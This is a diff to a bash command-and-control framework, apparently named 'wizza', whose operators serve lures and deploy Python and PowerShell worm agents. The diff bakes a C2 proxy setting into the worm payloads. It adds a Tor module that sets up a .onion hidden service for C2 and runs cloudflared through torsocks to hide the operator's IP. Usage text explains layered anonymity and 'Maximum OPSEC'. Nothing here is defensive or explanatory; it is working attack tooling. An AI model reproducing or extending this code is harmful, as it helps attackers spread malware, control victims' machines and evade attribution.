@@ -22,7 +22,7 @@ WIZZA_CFG="$HOME/.wizza_config"
 # ── Load / save wizza config ──────────────────────────────────
 load_wizza_cfg() {
     CUSTOM_DOMAIN=""; LURE_PATH="/docs"; LURE_TITLE="Security Certificate Update"
-    CF_TUNNEL_NAME=""; CF_DOMAIN=""
+    CF_TUNNEL_NAME=""; CF_DOMAIN=""; C2_PROXY_BAKE=""
     [ -f "$WIZZA_CFG" ] || return
     while IFS='=' read -r k v; do
         case "$k" in
@@ -31,6 +31,7 @@ load_wizza_cfg() {
             LURE_TITLE)      LURE_TITLE="$v" ;;
             CF_TUNNEL_NAME)  CF_TUNNEL_NAME="$v" ;;
             CF_DOMAIN)       CF_DOMAIN="$v" ;;
+            C2_PROXY)        C2_PROXY_BAKE="$v" ;;
         esac
     done < "$WIZZA_CFG"
     # CF_DOMAIN is the active custom domain (named tunnel)
@@ -38,8 +39,8 @@ load_wizza_cfg() {
     [ -n "$CF_DOMAIN" ] && CUSTOM_DOMAIN="$CF_DOMAIN"
 }
 save_wizza_cfg() {
-    printf 'CUSTOM_DOMAIN=%s\nLURE_PATH=%s\nLURE_TITLE=%s\nCF_TUNNEL_NAME=%s\nCF_DOMAIN=%s\n' \
-        "$CUSTOM_DOMAIN" "$LURE_PATH" "$LURE_TITLE" "$CF_TUNNEL_NAME" "$CF_DOMAIN" > "$WIZZA_CFG"
+    printf 'CUSTOM_DOMAIN=%s\nLURE_PATH=%s\nLURE_TITLE=%s\nCF_TUNNEL_NAME=%s\nCF_DOMAIN=%s\nC2_PROXY=%s\n' \
+        "$CUSTOM_DOMAIN" "$LURE_PATH" "$LURE_TITLE" "$CF_TUNNEL_NAME" "$CF_DOMAIN" "$C2_PROXY_BAKE" > "$WIZZA_CFG"
 }
 load_wizza_cfg
 
@@ -3689,8 +3690,11 @@ cmd_payload() {
 
     # Bake URL into agents
     C2URL="$TUNNEL_URL"
-    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/worm_agent.py"  > "$OP/payloads/worm_agent.py"
-    sed "s|__C2URL__|$C2URL|g" "$WORM_SRC/worm_agent.ps1"  > "$OP/payloads/worm_agent.ps1"
+    # C2_PROXY: read from env or ~/.wizza_config; blank = direct
+    C2PROXY="${C2_PROXY_BAKE:-}"
+    [ -z "$C2PROXY" ] && C2PROXY=$(grep '^C2_PROXY=' "$WIZZA_CFG" 2>/dev/null | cut -d'=' -f2-)
+    sed "s|__C2URL__|$C2URL|g; s|__C2PROXY__|$C2PROXY|g" "$AGENT_SRC/worm_agent.py"  > "$OP/payloads/worm_agent.py"
+    sed "s|__C2URL__|$C2URL|g; s|__C2PROXY__|$C2PROXY|g" "$WORM_SRC/worm_agent.ps1"  > "$OP/payloads/worm_agent.ps1"
     sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/agent_http.py"  > "$OP/payloads/agent_http.py"
     cp "$OP/payloads/agent_http.py" "$OP/payloads/agent.py"
     sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/agent.ps1"  > "$OP/payloads/agent.ps1"
@@ -4109,6 +4113,140 @@ CFEOF
     echo -e "  ${G}║  Run:  start up / start payload / start mitm             ║${N}"
     echo -e "  ${G}╚══════════════════════════════════════════════════════════╝${N}"
     echo ""
+}
+
+cmd_tor() {
+    local SUB="${1:-}"
+    banner
+    echo -e "  ${Y}━━━ TOR ANONYMITY MODULE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo ""
+
+    case "$SUB" in
+        setup|"")
+            # ── Check dependencies ────────────────────────────────────────
+            command -v tor      &>/dev/null || { err "tor not installed. Run: sudo apt install tor"; return 1; }
+
+            # ── Configure Tor hidden service for C2 ───────────────────────
+            TOR_HS_DIR="/var/lib/tor/wizza_c2"
+            TOR_CFG="/etc/tor/torrc"
+            HS_BLOCK="# WIZZA C2 hidden service
+HiddenServiceDir $TOR_HS_DIR
+HiddenServicePort 80 127.0.0.1:8888"
+
+            if grep -q "wizza_c2" "$TOR_CFG" 2>/dev/null; then
+                info "Hidden service already configured in $TOR_CFG"
+            else
+                echo -e "  ${C}Adding hidden service to $TOR_CFG (requires sudo)${N}"
+                echo "$HS_BLOCK" | sudo tee -a "$TOR_CFG" > /dev/null && ok "torrc updated" || { err "Failed to update torrc — run manually"; return 1; }
+            fi
+
+            # ── Start / reload Tor ────────────────────────────────────────
+            if systemctl is-active --quiet tor 2>/dev/null; then
+                sudo systemctl reload tor 2>/dev/null || sudo systemctl restart tor 2>/dev/null
+            else
+                sudo systemctl start tor 2>/dev/null || sudo service tor start 2>/dev/null
+            fi
+
+            # Wait for .onion hostname to appear
+            info "Waiting for .onion address (up to 30s)..."
+            for i in $(seq 1 30); do
+                sleep 1
+                if [ -f "$TOR_HS_DIR/hostname" ]; then break; fi
+                printf "  [%ds]\r" "$i"
+            done
+            echo ""
+
+            if [ ! -f "$TOR_HS_DIR/hostname" ]; then
+                err ".onion hostname not generated — check: sudo journalctl -u tor"
+                return 1
+            fi
+
+            ONION=$(sudo cat "$TOR_HS_DIR/hostname" 2>/dev/null)
+            ok ".onion address: ${W}http://$ONION${N}"
+            echo ""
+            echo -e "  ${C}Bake this into agents as primary or fallback C2:${N}"
+            echo -e "  ${W}C2_PRIMARY  = \"http://$ONION\"${N}"
+            echo -e "  ${W}C2_FALLBACK = [\"http://$ONION\"]   # alongside CF URL${N}"
+            echo ""
+            echo -e "  ${Y}Agents need PySocks to reach .onion:${N}"
+            echo -e "    ${W}pip install PySocks${N}  (or embed in Python worm payload)"
+            echo -e "    ${W}C2_PROXY=socks5h://127.0.0.1:9050${N}  (point agent at local Tor client)"
+            echo ""
+            echo -e "  ${C}Wrap cloudflared in Tor (operator anonymity):${N}"
+            echo -e "    ${W}start tor cf${N}"
+            ;;
+
+        cf)
+            # ── torsocks wrapping for cloudflared (hides your IP from CF) ─
+            command -v torsocks &>/dev/null || { err "torsocks not installed. Run: sudo apt install torsocks"; return 1; }
+            command -v tor      &>/dev/null || { err "tor not found"; return 1; }
+            # Ensure Tor is running
+            systemctl is-active --quiet tor 2>/dev/null || sudo systemctl start tor 2>/dev/null
+            info "Starting cloudflared through Tor (CF only sees Tor exit IP)..."
+            kill $TUNNEL_PID 2>/dev/null
+            pkill -f "cloudflared tunnel\|cloudflared.*http" 2>/dev/null
+            sleep 1
+            TUNNEL_LOG="/tmp/tunnel_tor.log"
+            printf "protocol: quic\nedge-ip-version: auto\n" > /tmp/cf_quick_tor.yml
+            torsocks cloudflared tunnel --config /tmp/cf_quick_tor.yml --url http://localhost:8888 \
+                --no-autoupdate > "$TUNNEL_LOG" 2>&1 &
+            TUNNEL_PID=$!
+            info "Waiting for tunnel URL..."
+            for i in $(seq 1 30); do
+                sleep 1
+                RAW_URL=$(grep -o 'https://[a-z0-9][a-z0-9-]*-[a-z0-9][a-z0-9-]*\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -1)
+                [ -n "$RAW_URL" ] && break
+                printf "  [%ds]\r" "$i"
+            done
+            echo ""
+            if [ -n "$RAW_URL" ]; then
+                ok "Tunnel via Tor: ${W}$RAW_URL${N}"
+                echo -e "  ${G}Cloudflare only sees a Tor exit node IP — your real IP is hidden from CF${N}"
+            else
+                err "Tunnel failed — check: tail $TUNNEL_LOG"
+                kill $TUNNEL_PID 2>/dev/null
+            fi
+            ;;
+
+        proxy)
+            # ── Save proxy URL — baked into agents on next `start up` ─────
+            ask "Enter proxy URL (e.g. socks5h://127.0.0.1:9050 or http://host:8080, blank to clear):"
+            PROXY_URL="$REPLY"
+            C2_PROXY_BAKE="$PROXY_URL"
+            save_wizza_cfg
+            ok "Proxy saved to $WIZZA_CFG"
+            echo -e "  ${C}Agents will route C2 comms through: ${W}${PROXY_URL:-direct (no proxy)}${N}"
+            echo -e "  ${Y}Run ${W}start up${Y} to rebake agents with this proxy.${N}"
+            ;;
+
+        status)
+            echo -e "${C}Tor service:${N}"
+            systemctl status tor --no-pager -l 2>/dev/null | head -8 || service tor status 2>/dev/null | head -8
+            echo ""
+            TOR_HS_DIR="/var/lib/tor/wizza_c2"
+            if [ -f "$TOR_HS_DIR/hostname" ]; then
+                ONION=$(sudo cat "$TOR_HS_DIR/hostname" 2>/dev/null)
+                echo -e "${C}.onion:${N} ${W}http://$ONION${N}"
+            else
+                echo -e "${Y}.onion: not configured (run: start tor setup)${N}"
+            fi
+            ;;
+
+        *)
+            echo -e "${W}Usage:${N}"
+            echo -e "  ${C}start tor setup${N}   — configure Tor hidden service (.onion) for C2"
+            echo -e "  ${C}start tor cf${N}       — run cloudflared through Tor (hides your IP from CF)"
+            echo -e "  ${C}start tor proxy${N}    — bake a SOCKS5/HTTP proxy into agent payloads"
+            echo -e "  ${C}start tor status${N}   — show Tor status + .onion address"
+            echo ""
+            echo -e "  ${C}Anonymity layers:${N}"
+            echo -e "    1. ${W}start tor cf${N}     — Cloudflare sees Tor exit, not your IP"
+            echo -e "    2. ${W}start tor setup${N}  — agents beacon to .onion (no CF at all)"
+            echo -e "    3. ${W}start tor proxy${N}  — agent traffic itself routes via Tor/SOCKS5"
+            echo ""
+            echo -e "  ${Y}Maximum OPSEC: run C2 on a rented VPS + use named CF tunnel via torsocks${N}"
+            ;;
+    esac
 }
 
 cmd_down() {
@@ -6082,6 +6220,7 @@ case "$CMD" in
                     else cmd_untrack; fi ;;
     shellcode|sc)   init_files; cmd_shellcode "$2" ;;
     deinfect)       init_files; cmd_deinfect "$2" ;;
+    tor)            init_files; cmd_tor "$2" ;;
     poly)           init_files; cmd_poly   "$2" ;;
     evade)          init_files; cmd_evade  "$2" ;;
     exploit)        init_files; cmd_exploit "$2" ;;
